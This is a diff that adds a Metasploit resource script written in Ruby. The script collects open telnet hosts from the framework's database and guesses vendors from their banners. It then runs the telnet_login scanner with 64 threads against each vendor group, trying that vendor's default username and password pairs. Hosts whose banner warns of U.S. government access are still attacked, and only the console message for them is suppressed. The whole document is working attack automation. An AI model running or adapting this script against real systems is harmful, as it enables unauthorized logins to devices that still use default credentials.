@@ -1,0 +1,126 @@
+<ruby>
+
+hosts = {}
+host_id_to_ip = {}			# mapping of host id to host ip
+
+# list of telnet banners to a vendor
+@fingerprints = CSV.read(File.join(Msf::Config.install_root, 'data', 'wordlists', 'telnet_default_fingerprints.csv'))
+
+# preferred default usernames for a given vendor
+@the_list = CSV.read(File.join(Msf::Config.install_root, 'data', 'wordlists', 'telnet_users.csv'))
+
+
+def checkVendor(banner)
+# strip out \n and \r, check the finger prints and return the vendors if known
+list = []
+	banner.gsub!('\x0a', '')
+	banner.gsub!('\x0d', '')
+	@fingerprints.each do |fp|
+		if ( banner =~ /#{fp[0]}/ )
+			list.push(fp[1])
+		end
+	end
+	return list if list.count > 0
+	return nil
+
+end
+
+def vendorToUsers(vendor)
+# take a given vendor and return a list of preferred default usernames/passwords
+	@the_list.each do |line|
+		if(line[0] == vendor)
+			list = line[1].split(/\\x01/)
+			return list
+		end
+	end
+	return nil
+end
+
+begin
+# get a mapping of host_ids to IP addresses for populating targets
+	framework.db.hosts.each do |host|
+		host_id_to_ip[host.id] = host.address
+	end
+	# uncomment if you want to reconnect if it fails
+#	rescue ActiveRecord::ConnectionNotEstablished
+#		puts "DB not connected...trying to connect"
+#		self.run_single('db_connect <db>')
+#		puts "trying again..."
+#		retry
+end
+
+
+
+framework.db.services.each do |service|
+# for each service, if it is telnet and open, add it to list of targets
+	if ( service.port == 23 and service.proto == 'tcp' )
+		ip = host_id_to_ip[service.host_id]
+		info = service.info
+		if(info != '')
+			hosts["#{ip}"] = info
+		end
+	end
+end
+
+self.run_single("use auxiliary/scanner/telnet/telnet_login")
+self.run_single("set VERBOSE false")
+self.run_single("set USER_AS_PASS false")
+self.run_single("set BLANK_PASSWORDS false")
+self.run_single("set THREADS 64")
+
+vendor_ip_lists = {}
+
+hosts.each do |rhost|
+# for each host, check the vendor, combine like vendor into an IP target list (to take advantage of scanner threading)
+		vendor_list = checkVendor(rhost[1])
+		if(vendor_list != nil )
+			vendor_list.each do |x|
+				if (vendor_ip_lists[x] == nil)
+					vendor_ip_lists[x] = "#{rhost[0]} "
+				else
+					vendor_ip_lists[x] << "#{rhost[0]} "
+				end
+			end
+		else
+			if(not rhost[1] =~ /YOU ARE ACCESSING A U\.S\. GOVERNMENT/)
+				puts "********** No vendor for #{rhost[0]} / #{rhost[1]}..."
+			end
+			if(vendor_ip_lists['none'] == nil)
+				vendor_ip_lists['none'] = "#{rhost[0]} "
+			else
+				vendor_ip_lists['none'] << "#{rhost[0]} "
+			end
+		end
+end
+
+vendor_ip_lists.each do |vendor, list|
+# for each vendor, set RHOSTS, then try each username/password combo
+	puts "**** Doing Vendor #{vendor} ****"
+	users = vendorToUsers(vendor)
+	self.run_single("set RHOSTS #{list}")
+	if(users == nil)
+		self.run_single('unset PASSWORD')
+		self.run_single('unset USERNAME')
+		self.run_single('exploit')
+	else
+		users.each do |c|
+
+#	print "For vendor #{vendor} would try #{users.inspect} against #{list.inspect}"
+			u,p = c.split(/\\x00/)
+			if("#{p}" != '')
+				self.run_single("set PASSWORD #{p}")
+			else
+				self.run_single("unset PASSWORD")
+			end
+			if("#{u}" != '')
+				self.run_single("set USERNAME #{u}")
+			else
+				self.run_single("unset USERNAME")
+			end
+			self.run_single("exploit")
+		end 
+	end
+end
+
+</ruby>
+
